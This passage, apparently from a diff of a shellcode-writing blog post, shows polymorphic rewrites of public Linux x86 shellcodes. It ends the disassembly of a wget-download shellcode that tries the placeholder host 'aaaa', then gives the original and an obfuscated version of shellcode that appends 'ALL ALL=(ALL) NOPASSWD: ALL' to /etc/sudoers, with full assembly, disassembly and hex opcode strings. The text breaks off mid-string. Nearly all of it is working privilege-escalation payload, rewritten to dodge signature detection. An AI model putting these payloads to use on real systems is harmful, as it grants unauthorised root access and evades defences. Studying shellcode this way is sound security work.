+</span><span class='line'> 804809b:       d1 0c <span class="m">24</span>                ror    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,1
+</span><span class='line'> 804809e:       <span class="m">68</span> 5e c4 d2 dc          push   0xdcd2c45e
+</span><span class='line'> 80480a3:       d1 0c <span class="m">24</span>                ror    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,1
+</span><span class='line'> 80480a6:       <span class="m">68</span> 5e ea e6 e4          push   0xe4e6ea5e
+</span><span class='line'> 80480ab:       d1 0c <span class="m">24</span>                ror    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,1
+</span><span class='line'> 80480ae:       <span class="m">54</span>                      push   esp
+</span><span class='line'> 80480af:       5b                      pop    ebx
+</span><span class='line'> 80480b0:       8d 4d f8                lea    ecx,<span class="o">[</span>ebp-0x8<span class="o">]</span>
+</span><span class='line'> 80480b3:       <span class="m">52</span>                      push   edx
+</span><span class='line'> 80480b4:       <span class="m">89</span> 4d dc                mov    DWORD PTR <span class="o">[</span>ebp-0x24<span class="o">]</span>,ecx
+</span><span class='line'> 80480b7:       <span class="m">89</span> 5d d8                mov    DWORD PTR <span class="o">[</span>ebp-0x28<span class="o">]</span>,ebx
+</span><span class='line'> 80480ba:       8d 4d d8                lea    ecx,<span class="o">[</span>ebp-0x28<span class="o">]</span>
+</span><span class='line'> 80480bd:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'>Shellcode size: 63
+</span><span class='line'><span class="se">\x</span>6a<span class="se">\x</span>ff<span class="se">\x</span>58<span class="se">\x</span>f7<span class="se">\x</span>d8<span class="se">\x</span>04<span class="se">\x</span>0a<span class="se">\x</span>99<span class="se">\x</span>89<span class="se">\x</span>e5<span class="se">\x</span>52<span class="se">\x</span>68<span class="se">\x</span>61<span class="se">\x</span>61<span class="se">\x</span>61<span class="se">\x</span>61<span class="se">\x</span>52<span class="se">\x</span>52<span class="se">\x</span>c6<span class="se">\x</span>45<span class="se">\x</span>f0<span class="se">\x</span>74<span class="se">\x</span>68<span class="se">\x</span>5e<span class="se">\x</span>ee<span class="se">\x</span>ce<span class="se">\x</span>ca<span class="se">\x</span>d1<span class="se">\x</span>0c<span class="se">\x</span>24<span class="se">\x</span>68<span class="se">\x</span>5e<span class="se">\x</span>c4<span class="se">\x</span>d2<span class="se">\x</span>dc<span class="se">\x</span>d1<span class="se">\x</span>0c<span class="se">\x</span>24<span class="se">\x</span>68<span class="se">\x</span>5e<span class="se">\x</span>ea<span class="se">\x</span>e6<span class="se">\x</span>e4<span class="se">\x</span>d1<span class="se">\x</span>0c<span class="se">\x</span>24<span class="se">\x</span>54<span class="se">\x</span>5b<span class="se">\x</span>8d<span class="se">\x</span>4d<span class="se">\x</span>f8<span class="se">\x</span>52<span class="se">\x</span>89<span class="se">\x</span>4d<span class="se">\x</span>dc<span class="se">\x</span>89<span class="se">\x</span>5d<span class="se">\x</span>d8<span class="se">\x</span>8d<span class="se">\x</span>4d<span class="se">\x</span>d8<span class="se">\x</span>cd<span class="se">\x</span>80
+</span><span class='line'>cc -DSHELLCODE<span class="o">=</span><span class="sb">`</span>asm-opcodes 611<span class="sb">`</span> -W -Wall -fno-stack-protector -zexecstack -o shellcode ../skel.c
+</span></code></pre></td></tr></table></div></figure>
+
+
+
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>./shellcode
+</span><span class='line'>Shellcode length: 63
+</span><span class='line'>--2018-08-08 23:02:04--  http://aaaa/
+</span><span class='line'>Resolving aaaa <span class="o">(</span>aaaa<span class="o">)</span>... failed: Name or service not known.
+</span><span class='line'>wget: unable to resolve host address <span class="s1">&#39;aaaa&#39;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<h3>3. Edit /etc/sudoers for full access (62)</h3>
+
+<p>The final <a href="http://shell-storm.org/shellcode/files/shellcode-62.php">one</a> grants root access to every single user on the machine. It&rsquo;s size is <strong>86 bytes</strong>, meaning that the altered shellcode should be at the most <strong>129 bytes</strong>.</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span><span class="p">:</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>                        <span class="err">;</span> <span class="no">nul</span> <span class="no">character</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x7372656f</span>           <span class="err">;</span> <span class="no">oers</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x6475732f</span>           <span class="err">;</span> <span class="err">/</span><span class="no">sud</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x6374652f</span>           <span class="err">;</span> <span class="err">/</span><span class="no">etc</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>                    <span class="err">;</span> <span class="no">pathname</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">cx</span><span class="p">,</span> <span class="mi">0x401</span>                   <span class="err">;</span> <span class="no">flags</span> <span class="p">(</span><span class="no">O_WRONLY</span> <span class="err">|</span> <span class="no">O_APPEND</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x5</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">open</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*,</span> <span class="no">int</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>                    <span class="err">;</span> <span class="no">move</span> <span class="no">new</span> <span class="no">file</span> <span class="no">descriptor</span>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">eax</span>                        <span class="err">;</span> <span class="no">nul</span> <span class="no">character</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0xa4c4c41</span>            <span class="err">;</span> <span class="no">ALL</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x203a4457</span>           <span class="err">;</span> <span class="no">WD</span><span class="p">:</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x53534150</span>           <span class="err">;</span> <span class="no">PASS</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x4f4e2029</span>           <span class="err">;</span> <span class="p">)</span> <span class="no">NO</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x4c4c4128</span>           <span class="err">;</span> <span class="p">(</span><span class="no">ALL</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x3d4c4c41</span>           <span class="err">;</span> <span class="no">ALL</span><span class="err">=</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">dword</span> <span class="mi">0x204c4c41</span>           <span class="err">;</span> <span class="no">ALL</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>                    <span class="err">;</span> <span class="no">buf</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">0x1c</span>                    <span class="err">;</span> <span class="no">count</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x4</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">ssize_t</span> <span class="no">write</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">const</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">size_t</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x6</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">close</span><span class="p">(</span><span class="no">int</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">ebx</span><span class="p">,</span><span class="no">ebx</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x1</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">exit</span><span class="p">(</span><span class="no">int</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Decided to drop the <a href="http://man7.org/linux/man-pages/man2/close.2.html">close(2)</a> and <a href="http://man7.org/linux/man-pages/man3/exit.3.html">exit(2)</a> system calls since they don&rsquo;t bring any advantages whatsoever and moreover, prunning them allowed to focus more on MMX, FPU and SSE instructions. The total size of the morphed code is 128 bytes:</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+<span class='line-number'>49</span>
+<span class='line-number'>50</span>
+<span class='line-number'>51</span>
+<span class='line-number'>52</span>
+</pre></td><td class='code'><pre><code class='asm'><span class='line'><span class="nf">global</span> <span class="no">_start</span>
+</span><span class='line'>
+</span><span class='line'><span class="nf">section</span> <span class="no">.text</span>
+</span><span class='line'><span class="nl">_start:</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">esp</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">make</span> <span class="no">the</span> <span class="no">base</span> <span class="no">pointer</span> <span class="no">the</span> <span class="no">same</span> <span class="no">as</span> <span class="no">the</span> <span class="no">current</span> <span class="no">stack</span> <span class="no">pointer</span><span class="p">,</span> <span class="no">since</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">operations</span> <span class="no">with</span> <span class="no">pointers</span> <span class="no">are</span> <span class="no">one</span> <span class="no">byte</span> <span class="no">smaller</span> <span class="no">with</span> <span class="no">the</span> <span class="no">former</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ebp</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">xor</span> <span class="no">eax</span><span class="p">,</span> <span class="no">eax</span>
+</span><span class='line'>  <span class="nf">cdq</span>                             <span class="err">;</span> <span class="no">make</span> <span class="no">edx</span> <span class="no">zero</span><span class="p">,</span> <span class="no">too</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xcafebabe</span>                 <span class="err">;</span> <span class="no">initial</span> <span class="no">xor</span> <span class="no">value</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                        <span class="err">;</span> <span class="no">nul</span> <span class="no">character</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0xb98cdfd1</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x17071640</span>
+</span><span class='line'>  <span class="nf">movd</span> <span class="no">mm0</span><span class="p">,</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x4</span><span class="err">]</span>           <span class="err">;</span> <span class="no">load</span> <span class="no">initial</span> <span class="no">xor</span> <span class="no">value</span>
+</span><span class='line'>  <span class="nf">pxor</span> <span class="no">mm0</span><span class="p">,</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="err">]</span>           <span class="err">;</span> <span class="no">oers</span>
+</span><span class='line'>  <span class="nf">movd</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0xc</span><span class="err">]</span><span class="p">,</span> <span class="no">mm0</span>           <span class="err">;</span> <span class="no">overwrite</span> <span class="no">result</span> <span class="no">on</span> <span class="no">the</span> <span class="no">stack</span>
+</span><span class='line'>  <span class="nf">pxor</span> <span class="no">mm0</span><span class="p">,</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="err">]</span>          <span class="err">;</span> <span class="err">/</span><span class="no">sud</span> <span class="p">(</span><span class="no">xor</span> <span class="no">with</span> <span class="no">the</span> <span class="no">previous</span> <span class="no">result</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">movd</span> <span class="err">[</span><span class="no">ebp</span> <span class="p">-</span> <span class="mi">0x10</span><span class="err">]</span><span class="p">,</span> <span class="no">mm0</span>          <span class="err">;</span> <span class="no">overwrite</span> <span class="no">result</span> <span class="no">on</span> <span class="no">the</span> <span class="no">stack</span>
+</span><span class='line'>  <span class="nf">emms</span>                            <span class="err">;</span> <span class="no">done</span> <span class="no">with</span> <span class="no">mmx</span><span class="p">,</span> <span class="no">switch</span> <span class="no">to</span> <span class="no">x87</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x6374652e</span>                 <span class="err">;</span> <span class="no">.etc</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">esp</span>                    <span class="err">;</span> <span class="no">pathname</span>
+</span><span class='line'>  <span class="nf">inc</span> <span class="no">byte</span> <span class="err">[</span><span class="no">ebx</span><span class="err">]</span>                  <span class="err">;</span> <span class="no">make</span> <span class="no">the</span> <span class="no">first</span> <span class="no">character</span> <span class="no">a</span> <span class="no">slash</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x20</span>
+</span><span class='line'>  <span class="nf">fild</span> <span class="no">dword</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span>                <span class="err">;</span> <span class="no">load</span> <span class="no">current</span> <span class="no">value</span> <span class="no">on</span> <span class="no">the</span> <span class="no">stack</span>
+</span><span class='line'>  <span class="nf">fmul</span> <span class="no">st0</span>                        <span class="err">;</span> <span class="no">multiply</span> <span class="no">by</span> <span class="no">itself</span>
+</span><span class='line'>  <span class="nf">fist</span> <span class="no">dword</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span>                <span class="err">;</span> <span class="no">overwrite</span> <span class="no">value</span> <span class="no">on</span> <span class="no">the</span> <span class="no">stack</span>
+</span><span class='line'>  <span class="nf">pop</span> <span class="no">ecx</span>
+</span><span class='line'>  <span class="nf">inc</span> <span class="no">ecx</span>                         <span class="err">;</span> <span class="no">flags</span> <span class="p">(</span><span class="no">O_WRONLY</span> <span class="err">|</span> <span class="no">O_APPEND</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">or</span> <span class="no">al</span><span class="p">,</span> <span class="mi">0x5</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">int</span> <span class="no">open</span><span class="p">(</span><span class="no">const</span> <span class="no">char</span> <span class="p">*,</span> <span class="no">int</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span><span class='line'>
+</span><span class='line'>  <span class="nf">xchg</span> <span class="no">ebx</span><span class="p">,</span> <span class="no">eax</span>                   <span class="err">;</span> <span class="no">move</span> <span class="no">new</span> <span class="no">file</span> <span class="no">descriptor</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="no">edx</span>                        <span class="err">;</span> <span class="no">nul</span> <span class="no">character</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x0a4c4c41</span>                 <span class="err">;</span> <span class="no">ALL</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x203a4457</span>                 <span class="err">;</span> <span class="no">WD</span><span class="p">:</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x53534150</span>                 <span class="err">;</span> <span class="no">PASS</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x4f4e2029</span>                 <span class="err">;</span> <span class="p">)</span> <span class="no">NO</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x4c4c4128</span>                 <span class="err">;</span> <span class="p">(</span><span class="no">ALL</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x3d4c4c41</span>                 <span class="err">;</span> <span class="no">ALL</span><span class="err">=</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x204c4c41</span>                 <span class="err">;</span> <span class="no">ALL</span>
+</span><span class='line'>  <span class="nf">mov</span> <span class="no">ecx</span><span class="p">,</span> <span class="no">esp</span>                    <span class="err">;</span> <span class="no">buf</span>
+</span><span class='line'>  <span class="nf">or</span> <span class="no">dl</span><span class="p">,</span> <span class="mi">0x1c</span>                     <span class="err">;</span> <span class="no">count</span> <span class="p">(</span><span class="mi">28</span> <span class="no">bytes</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">push</span> <span class="mi">0x2</span>
+</span><span class='line'>  <span class="nf">movss</span> <span class="no">xmm0</span><span class="p">,</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span>
+</span><span class='line'>  <span class="nf">addss</span> <span class="no">xmm0</span><span class="p">,</span> <span class="err">[</span><span class="no">esp</span><span class="err">]</span>
+</span><span class='line'>  <span class="nf">movd</span> <span class="no">eax</span><span class="p">,</span> <span class="no">xmm0</span>
+</span><span class='line'>  <span class="err">;</span> <span class="nf">ssize_t</span> <span class="no">write</span><span class="p">(</span><span class="no">int</span><span class="p">,</span> <span class="no">const</span> <span class="no">void</span> <span class="p">*,</span> <span class="no">size_t</span><span class="p">)</span>
+</span><span class='line'>  <span class="nf">int</span> <span class="mi">0x80</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>To partially build the filename, the MMX XOR functions were used with an initial XOR value. The resulting value serves as the XOR value to the next one:</p>
+
+<pre><code>0xcafebabe ^ 0xb98cdfd1 = 0x7372656f ^ 0x17071640 = 0x6475732f
+</code></pre>
+
+<p>Following that, the <a href="https://c9x.me/x86/html/file_module_x86_id_77.html">emms</a> instruction is issued to signal the CPU that MMX operations are done and the shared registers are going to be used by the x87 FPU, which is going to be needed by the <a href="https://c9x.me/x86/html/file_module_x86_id_104.html">fmul</a> instruction to calculate the flags for the <a href="http://man7.org/linux/man-pages/man2/open.2.html">open(2)</a> system call:</p>
+
+<pre><code>O_WRONLY | O_APPEND = 0x401 = (0x20 * 0x20) + 0x1
+</code></pre>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+<span class='line-number'>48</span>
+</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="nv">$ </span>make <span class="nv">PROG</span><span class="o">=</span>62
+</span><span class='line'>nasm  -f elf32 -o 62.o 62.asm
+</span><span class='line'>ld -N -zexecstack -o <span class="m">62</span> 62.o
+</span><span class='line'><span class="m">08048080</span> &lt;_start&gt;:
+</span><span class='line'> 8048080:       <span class="m">54</span>                      push   esp
+</span><span class='line'> 8048081:       5d                      pop    ebp
+</span><span class='line'> 8048082:       <span class="m">31</span> c0                   xor    eax,eax
+</span><span class='line'> 8048084:       <span class="m">99</span>                      cdq
+</span><span class='line'> 8048085:       <span class="m">68</span> be ba fe ca          push   0xcafebabe
+</span><span class='line'> 804808a:       <span class="m">52</span>                      push   edx
+</span><span class='line'> 804808b:       <span class="m">68</span> d1 df 8c b9          push   0xb98cdfd1
+</span><span class='line'> 8048090:       <span class="m">68</span> <span class="m">40</span> <span class="m">16</span> <span class="m">07</span> <span class="m">17</span>          push   0x17071640
+</span><span class='line'> 8048095:       0f 6e <span class="m">45</span> <span class="nb">fc             </span>movd   mm0,DWORD PTR <span class="o">[</span>ebp-0x4<span class="o">]</span>
+</span><span class='line'> 8048099:       0f ef <span class="m">45</span> f4             pxor   mm0,QWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>
+</span><span class='line'> 804809d:       0f 7e <span class="m">45</span> f4             movd   DWORD PTR <span class="o">[</span>ebp-0xc<span class="o">]</span>,mm0
+</span><span class='line'> 80480a1:       0f ef <span class="m">45</span> f0             pxor   mm0,QWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>
+</span><span class='line'> 80480a5:       0f 7e <span class="m">45</span> f0             movd   DWORD PTR <span class="o">[</span>ebp-0x10<span class="o">]</span>,mm0
+</span><span class='line'> 80480a9:       0f <span class="m">77</span>                   emms
+</span><span class='line'> 80480ab:       <span class="m">68</span> 2e <span class="m">65</span> <span class="m">74</span> <span class="m">63</span>          push   0x6374652e
+</span><span class='line'> 80480b0:       <span class="m">89</span> e3                   mov    ebx,esp
+</span><span class='line'> 80480b2:       fe <span class="m">03</span>                   inc    BYTE PTR <span class="o">[</span>ebx<span class="o">]</span>
+</span><span class='line'> 80480b4:       6a <span class="m">20</span>                   push   0x20
+</span><span class='line'> 80480b6:       db <span class="m">04</span> <span class="m">24</span>                fild   DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'> 80480b9:       d8 c8                   fmul   st,st<span class="o">(</span>0<span class="o">)</span>
+</span><span class='line'> 80480bb:       db <span class="m">14</span> <span class="m">24</span>                fist   DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'> 80480be:       <span class="m">59</span>                      pop    ecx
+</span><span class='line'> 80480bf:       <span class="m">41</span>                      inc    ecx
+</span><span class='line'> 80480c0:       0c <span class="m">05</span>                   or     al,0x5
+</span><span class='line'> 80480c2:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'> 80480c4:       <span class="m">93</span>                      xchg   ebx,eax
+</span><span class='line'> 80480c5:       <span class="m">52</span>                      push   edx
+</span><span class='line'> 80480c6:       <span class="m">68</span> <span class="m">41</span> 4c 4c 0a          push   0xa4c4c41
+</span><span class='line'> 80480cb:       <span class="m">68</span> <span class="m">57</span> <span class="m">44</span> 3a <span class="m">20</span>          push   0x203a4457
+</span><span class='line'> 80480d0:       <span class="m">68</span> <span class="m">50</span> <span class="m">41</span> <span class="m">53</span> <span class="m">53</span>          push   0x53534150
+</span><span class='line'> 80480d5:       <span class="m">68</span> <span class="m">29</span> <span class="m">20</span> 4e 4f          push   0x4f4e2029
+</span><span class='line'> 80480da:       <span class="m">68</span> <span class="m">28</span> <span class="m">41</span> 4c 4c          push   0x4c4c4128
+</span><span class='line'> 80480df:       <span class="m">68</span> <span class="m">41</span> 4c 4c 3d          push   0x3d4c4c41
+</span><span class='line'> 80480e4:       <span class="m">68</span> <span class="m">41</span> 4c 4c <span class="m">20</span>          push   0x204c4c41
+</span><span class='line'> 80480e9:       <span class="m">89</span> e1                   mov    ecx,esp
+</span><span class='line'> 80480eb:       <span class="m">80</span> ca 1c                or     dl,0x1c
+</span><span class='line'> 80480ee:       6a <span class="m">02</span>                   push   0x2
+</span><span class='line'> 80480f0:       f3 0f <span class="m">10</span> <span class="m">04</span> <span class="m">24</span>          movss  xmm0,DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'> 80480f5:       f3 0f <span class="m">58</span> <span class="m">04</span> <span class="m">24</span>          addss  xmm0,DWORD PTR <span class="o">[</span>esp<span class="o">]</span>
+</span><span class='line'> 80480fa:       <span class="m">66</span> 0f 7e c0             movd   eax,xmm0
+</span><span class='line'> 80480fe:       <span class="nb">cd </span><span class="m">80</span>                   int    0x80
+</span><span class='line'>Shellcode size: 128
+</span><span class='line'><span class="se">\x</span>54<span class="se">\x</span>5d<span class="se">\x</span>31<span class="se">\x</span>c0<span class="se">\x</span>99<span class="se">\x</span>68<span class="se">\x</span>be<span class="se">\x</span>ba<span class="se">\x</span>fe<span class="se">\x</span>ca<span class="se">\x</span>52<span class="se">\x</span>68<span class="se">\x</span>d1<span class="se">\x</span>df<span class="se">\x</span>8c<span class="se">\x</span>b9<span class="se">\x</span>68<span class="se">\x</span>40<span class="se">\x</span>16<span class="se">\x</span>07<span class="se">\x</span>17<span class="se">\x</span>0f<span class="se">\x</span>6e<span class="se">\x</span>45<span class="se">\x</span>fc<span class="se">\x</span>0f<span class="se">\x</span>ef<span class="se">\x</span>45<span class="se">\x</span>f4<span class="se">\x</span>0f<span class="se">\x</span>7e<span class="se">\x</span>45<span class="se">\x</span>f4<span class="se">\x</span>0f<span class="se">\x</span>ef<span class="se">\x</span>45<span class="se">\x</span>f0<span class="se">\x</span>0f<span class="se">\x</span>7e<span class="se">\x</span>45<span class="se">\x</span>f0<span class="se">\x</span>0f<span class="se">\x</span>77<span class="se">\x</span>68<span class="se">\x</span>2e<span class="se">\x</span>65<span class="se">\x</span>74<span class="se">\x</span>63<span class="se">\x</span>89<span class="se">\x</span>e3<span class="se">\x</span>fe<span class="se">\x</span>03<span class="se">\x</span>6a<span class="se">\x</span>20<span class="se">\x</span>db<span class="se">\x</span>04<span class="se">\x</span>24<span class="se">\x</span>d8<span class="se">\x</span>c8<span class="se">\x</span>db<span class="se">\x</span>14<span class="se">\x</span>24<span class="se">\x</span>59<span class="se">\x</span>41<span class="se">\x</span>0c<span class="se">\x</span>05<span class="se">\x</span>cd<span class="se">\x</span>80<span class="se">\x</span>93<span class="se">\x</span>52<span class="se">\x</span>68<span class="se">\x</span>41<span class="se">\x</span>4c<span class="se">\x</span>4c<span class="se">\x</span>0a<span class="se">\x</span>68<span class="se">\x</span>57<span class="se">\x</span>44<span class="se">\x</span>3a<span class="se">\x</span>20<span class="se">\x</span>68<span class="se">\x</span>50<span class="se">\x</span>41<span 